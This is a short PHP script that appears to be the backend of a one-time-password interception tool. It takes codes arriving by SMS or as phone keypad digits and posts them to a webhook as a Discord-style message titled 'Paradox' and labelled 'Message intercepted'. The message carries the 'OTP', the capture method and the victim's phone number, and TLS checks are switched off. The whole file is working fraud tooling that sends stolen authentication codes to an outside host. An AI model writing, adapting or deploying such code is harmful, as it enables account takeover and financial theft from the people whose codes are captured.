<?php
$postdata = file_get_contents("php://input");
$getdata = $_GET['text'];
if (empty($getdata) && empty($postdata)) {
  http_response_code(204);
  exit();
}
$message = '';
$method = '';
$number = 'unknown';
if (!empty($getdata)) {
  $message = $getdata;
  $number = $_GET['msisdn'];
  $method = "MESSAGE";
}
$highest_confidence = 0;
$highest_confidence_text = '';
if (!empty($postdata)) {
  $obj = json_decode($postdata);
  $digits = $obj->dtmf->digits;
  if($digits == null){
      http_response_code(204);
      exit();
  }
  if($digits == ""){
      http_response_code(204);
      exit();
  }
  $message = $digits;
  $number = $obj->to;
  $method = "PIN PAD";
}

$url = "WEBHOOK";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
$data = '{"content":null,"embeds":[{"title":"Paradox","description":"```OTP🔒: '.$message.'```\n```Method📫: '.$method.'```\n```Phone Number📱: '.$number.'```\n```Transcript: '.$highest_confidence_text.'````","color":3819856,"author":{"name":"Message intercepted"}}],"attachments":[]}';
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);
curl_close($curl);
var_dump($resp);
?>
